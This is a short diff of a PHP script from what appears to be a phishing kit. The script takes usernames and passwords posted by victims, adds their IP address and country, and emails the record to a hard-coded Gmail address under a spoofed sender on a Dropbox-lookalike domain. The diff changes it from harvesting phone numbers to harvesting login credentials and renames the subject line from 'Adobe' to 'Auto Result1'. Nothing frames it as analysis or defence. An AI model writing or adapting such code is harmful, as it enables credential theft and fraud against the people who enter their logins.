@@ -6,14 +6,18 @@ $country = visitor_country();
 $msg = "---------------------------------------------------------------------------\n";
 $msg .= "Login\n";
 $msg .= "---------------------------------------------------------------------------\n";
-$msg .= "Phone Number : ".$_POST['mobile']."\n";
-$msg .= "IP  : ".$ip."\n";
+$msg .= "Username : ".$_POST['email']."\n";
+$msg .= "Password : ".$_POST['password']."\n";
+$msg .= "Country  : ".$country."\n";
 
+$msg .= "---------------------------------------------------------------------------\n";
+$msg .= "Sent from $ip on $time\n";
+$msg .= "Country: ".$country."\n";
 $msg .= "---------------------------------------------------------------------------\n";
 
 $to = "dianaedna101@gmail.com";
-$subject = "Adobe $ip $country";
-$from = "From: Adobe<newsupdate@servisdropbox.com>";
+$subject = "Auto Result1 $ip $country";
+$from = "From: Auto<newsupdate@servisdropbox.com>";
 {
 mail($to,$subject,$msg,$from);
 
